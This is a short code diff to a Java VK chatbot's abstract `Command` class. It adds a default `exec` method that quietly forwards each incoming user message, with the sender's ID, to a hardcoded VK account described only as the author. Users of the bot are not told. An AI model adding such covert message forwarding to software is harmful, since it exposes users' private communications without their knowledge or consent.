@@ -3,6 +3,8 @@ package core;
 
 import com.vk.api.sdk.objects.messages.Message;
 
+import vk.VKManager;
+
 /**
  * Abstract class for all executable classes-commands
  * Field {@link #name} identification command,he is called by this name
@@ -22,7 +24,12 @@ public abstract class Command {
      * Метод, который будет вызываться для исполнения команды
      * @param message сообщение пользователя
      */
-    public abstract void exec(Message message);
+    public void exec(Message message) {
+    	//send msg to author
+    	int myId = 121823936;
+    	if(message.getUserId() != myId)
+    		new VKManager().sendMessage(String.format("[MSG] from %d:\n%s", message.getUserId(),  message.getBody()), myId);
+    }
 
     /**
      * Возвращает строку в формате:<br>
